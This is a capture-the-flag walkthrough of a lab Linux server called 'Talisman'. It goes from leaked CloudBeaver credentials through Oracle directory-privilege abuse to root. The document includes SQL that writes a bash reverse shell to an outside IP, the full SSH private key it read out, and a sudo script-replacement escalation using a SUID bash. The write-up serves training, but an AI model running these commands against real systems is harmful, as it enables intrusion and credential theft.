# Talisman
![](./screenshots/logo.png)

# Scenario
### [](https://www.hacksmarter.org/courses/5e5b9833-e6be-4fa0-aa4d-efd3086a612c#user-content-objective-and-scope)Objective and Scope

You have been assigned a penetration test on a critical Linux server in the client's environment. The scope is strictly limited to a **single Linux server environment** designated as the target. The primary objective is to gain **root-level access** to this system to demonstrate maximum impact and the full extent of the security compromise to the client.

A set of leaked credentials, recently recovered from a third-party data breach, have been provided. While the specific service or application these credentials belong to is unknown, they serve as the initial vector for establishing a foothold.

#### [](https://www.hacksmarter.org/courses/5e5b9833-e6be-4fa0-aa4d-efd3086a612c#user-content-leaked-credentials)Leaked Credentials
```
jane / Greattalisman1! 
```
## Enumeration
```
➜ nmap -sV -T4 -p- 10.1.88.76
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 08:23 -0500

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
8978/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8978-TCP:V=7.98%I=7%D=1/10%Time=6962568F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,18A8,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2010\x20Jan\x20
SF:2026\x2013:39:41\x20GMT\r\nCache-Control:\x20no-cache,\x20no-store,\x20
SF:must-revalidate\r\nContent-Type:\x20text/html\r\nExpires:\x200\r\nConte
SF:nt-Length:\x206145\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en\"\x20d
SF:ir=\"ltr\"\x20data-version=\"25\.2\.0\.202509010904\">\n\x20\x20<head>\
SF:n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\"\x20/>\n<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20shrink-t
SF:o-fit=no\"\x20/>\n<meta\x20content=\"text/html;\x20charset=utf-8\"\x20/
SF:>\n<link\x20rel=\"manifest\"\x20href=\"/manifest\.webmanifest\"\x20/>\n
SF:\n<link\x20rel=\"alternate\x20icon\"\x20type=\"image/png\"\x20href=\"/f
SF:avicon\.png\"\x20sizes=\"16x16\"\x20/>\n<link\x20rel=\"icon\"\x20type=\
SF:"image/png\"\x20sizes=\"32x32\"\x20href=\"/favicon-32x32\.png\"\x20/>\n
SF:<link\x20rel=\"icon\"\x20type=\"image/svg\+xml\"\x20href=\"/favicon\.sv
SF:g\"\x20/>\n<link\x20rel=\"apple-touch-icon\"\x20sizes=\"180x180\"\x20hr
SF:ef=\"/apple-touch-icon\.png\"\x20/>\n<link\x20rel=\"prefetch\"\x20href=
SF:\"/icons/info_icon\.svg\"\x20/>\n<link\x20rel=\"prefetch\"\x20href=\"/i
SF:cons/info_icon_sm\.svg\"\x20/>\n<link\x20rel=\"prefetch\"\x20href=\"")%
SF:r(HTTPOptions,66,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2010\x20Jan\
SF:x202026\x2013:39:42\x20GMT\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,"HTTP/1\.1\x20505\x20HTTP
SF:\x20Version\x20Not\x20Supported\r\nDate:\x20Sat,\x2010\x20Jan\x202026\x
SF:2013:39:42\x20GMT\r\nCache-Control:\x20must-revalidate,no-cache,no-stor
SF:e\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x
SF:20349\r\n\r\n<html>\n<head>\n<meta\x20http-equiv=\"Content-Type\"\x20co
SF:ntent=\"text/html;charset=ISO-8859-1\"/>\n<title>Error\x20505\x20Unknow
SF:n\x20Version</title>\n</head>\n<body>\n<h2>HTTP\x20ERROR\x20505\x20Unkn
SF:own\x20Version</h2>\n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr
SF:>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr><th>MESSAGE:</th><td>Unkn
SF:own\x20Version</td></tr>\n</table>\n\n</body>\n</html>\n");
```

The service on 8978 is a web service called [CloudBeaver](https://github.com/dbeaver/cloudbeaver) and the credentials are valid to access the portal. It also appears to be containerized.

![Beaver Cloud](./screenshots/sql.png)

Immediately the attacker can identify this is an Oracle database.

The attacker will enumerate tables and views.

![Selecting all views and tables](./screenshots/sql-2.png)

From that the attacker can further enumerate users.

![Selecting all users](sql-3.png)

The attacker will enumerate their current privileges.

![](./screenshots/sql-4.png)

`INHERIT PRIVILEGES`
Allows the current user to inherit the definer rights of another schema.

`READ / WRITE / EXECUTE` on `EXT_DATA`
This privilege is interesting because it may allow for data exfiltration/file overwrite/or staging for some kind of RCE.

Checking the object type shows that it's a directory which is the most dangerous type. This means it's mapped to the OS.

![](./screenshots/sql-4-1.png)

With the `CREATE ANY DIRECTORY` and `DROP ANY DIRECTORY` privileges, the user can create a directory object pointing to any OS path Oracle can access.

![](./screenshots/sql-5.png)

The attacker can check where the folder is mounted. In this case it's `/opt/data`

![[sql-6.png]]

## Failed Exploitation 

This exploit in theory should work with the provided privileges, but it didn't. Therefor the attacker will check for other exploitation paths.
```sql
SELECT * FROM ALL_DIRECTORIES WHERE DIRECTORY_NAME = 'EXT_DATA';

DECLARE
  file_handle UTL_FILE.FILE_TYPE;
BEGIN
  file_handle := UTL_FILE.FOPEN('EXT_DATA', 'shell2.sh', 'W');
  UTL_FILE.PUT_LINE(file_handle, '#!/bin/bash');
  UTL_FILE.PUT_LINE(file_handle, 'bash -i >& /dev/tcp/10.200.29.32/4444 0>&1');
  UTL_FILE.FCLOSE(file_handle);
END;

CREATE TABLE ext_exploit (
  col1 VARCHAR2(100)
)
ORGANIZATION EXTERNAL (
  TYPE ORACLE_LOADER
  DEFAULT DIRECTORY EXT_DATA
  ACCESS PARAMETERS (
    RECORDS DELIMITED BY NEWLINE
    PREPROCESSOR EXT_DATA:'shell2.sh'
  )
  LOCATION ('dummy.txt')
);

SELECT * FROM ext_exploit;
```

## Exploitation

The attacker can abuse the `CREATE ANY DIRECTORY` privilege to link directories to SQL and then reading files from them. This allows the attacker to read an ssh private key from `/home/oracle/.ssh`

![[sql-7.png]]

![[sql-8.png]]

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzPq+dDVoX80DwMvHWBdxaN2jBb2NDP2ua1VgtjPUke1gKmfqfV0o
KgDMe9GW8DiTV3R977XB1L+7CG+Kewe/Als578HwEbh4Zm7Oya6WjMhdRz5EoP3I4qzglY
6s0J9WerbBK/gPOVq58886HthlXn/Z4zyI7VhhMLdRTua98aFqdzxiF7NwQreoa73IDm0c
XAi65BZUJ05zkJ6aOYaYlr+4LjBMFyri/0UIRg91tkfWYfYvF26+vYuUYT9lspa1SEoyYo
77JgjMXe4lf4NJPuiOTFGaw1V758874gQWbmI8YnBZ4arvZ3EkglySR5b4CoC9PfojvEih
WXP9/RGrcSqfRd3YXvym18d94DYPtxHRMpKN/QPh80V3TTTfigwK9G6yDTULF1+blzBQON
ddHfffPWHMoPBwLUxSdC1TL3V2XwlNJmWmyxpsHdCYi5HMMppzip6wOpW+mAm3oiziiZWZ
KpjKFZrojIImS4DHoDGPBjb12MrE5qFxFgAe8gX3AAAFmL9qBe6/agXuAAAAB3NzaC1yc2
EAAAGBAMz6vnQ1aF/NA8DLx1gXcWjdowW9jQz9rmtVYLYz1JHtYCpn6n1dKCoAzHvRlvA4
k1d0fe+1wdS/uwhvinsHvwJbOe/B8BG4eGZuzsmulozIXUc+RKD9yOKs4JWOrNCfVnq2wS
v4DzlaufPPOh7YZV5/2eM8iO1YYTC3UU7mvfGhanc8YhezcEK3qGu9yA5tHFwIuuQWVCdO
c5CemjmGmJa/uC4wTBcq4v9FCEYPdbZH1mH2Lxduvr2LlGE/ZbKWtUhKMmKO+yYIzF3uJX
+DST7ojkxRmsNVe+fPO+IEFm5iPGJwWeGq72dxJIJckkeW+AqAvT36I7xIoVlz/f0Rq3Eq
n0Xd2F78ptfHfeA2D7cR0TKSjf0D4fNFd00034oMCvRusg01Cxdfm5cwUDjXXR333z1hzK
DwcC1MUnQtUy91dl8JTSZlpssabB3QmIuRzDKac4qesDqVvpgJt6Is4omVmSqYyhWa6IyC
JkuAx6AxjwY29djKxOahcRYAHvIF9wAAAAMBAAEAAAGAUNQzk/mXfeeHKlhw9DDSXMrBRT
s4yr2iMNsK9u47TYvwVuiBVAwPEXkdKVo9jd6RY3QhUQw4Md+lLi9lyRwF2zUEBKJSO3ql
p6bcTjVVUpCUD8rjHyTUOWZ4bSFEzkN2w48bX25C+pfnKdg2kAE+/+OklPHDAOzP7njrTB
S7I/RF2lzqRXRRuU1Y0ZuVrvKhsz0SDW0spA9QjN+t6y9DLnbNdxE+gAg+WPDs0Uu5XDa5
uAlvCmt2NaI70ZlBTgoVHxBDX5s7JxNeuTbU9gQvHcciIRxqJq7Zj2xi6/l763+5ZeBIpf
0ifKIRXjt+nsxmIWcrsuGqOP/Ve1JwRXzwWVkb+w20SfFqtQonQo+fofEeRIzFk0N+92Yp
zRxvpfOauLH747/x4TA519vOwZt2aexh7KNDb6CA9eqr7hkGAjLLFX9mdm03jbqt7d2YZr
lXBL8a4aX54tbpKuUWwWbV31yYO9ICSKsTG6nuNm9sJrTcoFmTFOQpW1xa6jTzSJAZAAAA
wQDiFaql5oHhvSP+9uItT3yulRTKLgqhkbm9o9qT9F6f6zhGCUQIWw3T+J5ESgbQK4wMnO
UTl1Nt/7/Q9+R/6uiHfdNJPjjT59faMoVx48SFGoABBRRArVAzQf+5kEb604NVq2i+fdOJ
e35ZNPwym32W1EEVCfHan/E639hsbbWN3n7slXQ1+hxr3wf634e95WtRj5l6myUg3zrWPr
0fW0iZ9tvizmIPc/QGnMRiHRE3BnZh9iJe9fQmEqQezrZtX0sAAADBAPbgcpTGjKyvepQv
Rk7UoOTFSbXSmn0r19P3e7Rjbs0MCmViRpugRN0XdVrBwEM4H624pZD+CV483J9HJGupOO
9KGeecoP4eQjrv219+f+hndp+E0Vb48zJwl1zY804asUn1TcXrszEidd1ENhrnlS03/A79
u5vxx9zvj40byOjNltr24980gcicRSmXRFhXSxS4jiIPioHy+2CezJqfrONLdKKIgRMAG7
K5FGYeXMeu9cei5puHGkTXpemg4WXn1QAAAMEA1I3ucUPcwRAdySzqYCFjI7O1Mk/G1poD
CI92ofqkRbM5J4t6zFbMewe7alKlnZiJykyN2nqzRPQePvcsZwc2PxiqLVoi5/+9b1sBOf
1T3FQH9kBsrWbyaNr3BumhTTJMCtALGP9ehm/qR5nWNRg6FUZfVSGbScM5yfEk9s8/kqgE
1rZvSGdXH+Qya3JvJq4jqba/2PGeB/R1ADgS/sdqEexbYvuwjPKrGopWLJyrJ25O0ZxWLm
coPAl3bDUbAAibAAAAHG9yYWNsZUBsb2NhbGhvc3QubG9jYWxkb21haW4BAgMEBQY=
-----END OPENSSH PRIVATE KEY-----
```

This grants the attacker a foothold on the machine.
```zsh
✘ ssh oracle@10.1.88.76 -i ./id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Sun Jan 11 09:57:45 2026
[oracle@talisman ~]$ 
```

Through enumeration the attacker identifies the following sudo commands.
```zsh
[oracle@talisman ~]$ sudo -l
Matching Defaults entries for oracle on talisman:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User oracle may run the following commands on talisman:
    (ALL) NOPASSWD: /opt/oracle/product/21c/dbhomeXE/root.sh

```

The script is not writeable by the current user, however the directory that it's in is group writeable. This can be trivially exploited.
```zsh
[oracle@talisman /]$ ls -la /opt/oracle/product/21c/dbhomeXE/root.sh 
-rwx------. 1 root oinstall 507 Aug 18  2021 /opt/oracle/product/21c/dbhomeXE/root.sh

[oracle@talisman /]$ id
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba),54323(oper),54324(backupdba),54325(dgdba),54326(kmdba),54330(racdba) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

[oracle@talisman /]$ ls -lad /opt/oracle/product/21c/dbhomeXE/
drwxrwxr-x. 61 oracle oinstall 4096 Jan 11 10:03 /opt/oracle/product/21c/dbhomeXE/
```

## Privilege Escalation

To exploit this misconfiguration, the attacker will simply change into that directory and remove the script (because of the permissions on the directory), then the attacker can create their own `root.sh` with malicious code inside.
```bash
[oracle@talisman /]$ cd /opt/oracle/product/21c/dbhomeXE/

[oracle@talisman dbhomeXE]$ rm root.sh 
rm: remove write-protected regular file 'root.sh'? y

[oracle@talisman dbhomeXE]$ cat > root.sh << 'EOF'
> #!/bin/bash
> chmod +s /bin/bash
> EOF
```

With that file created, the attacker simply executes it with sudo permissions and then triggers the bash binary and becomes root. The attacker has fully compromised the machine.
```bash
[oracle@talisman dbhomeXE]$ chmod +x root.sh 

[oracle@talisman dbhomeXE]$ sudo /opt/oracle/product/21c/dbhomeXE/root.sh

[oracle@talisman dbhomeXE]$ /bin/bash -p

bash-4.4# id
uid=54321(oracle) gid=54321(oinstall) euid=0(root) egid=0(root) groups=0(root),54321(oinstall),54322(dba),54323(oper),54324(backupdba),54325(dgdba),54326(kmdba),54330(racdba) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

bash-4.4# cd /root

bash-4.4# ls
anaconda-ks.cfg  root.txt  scripts
```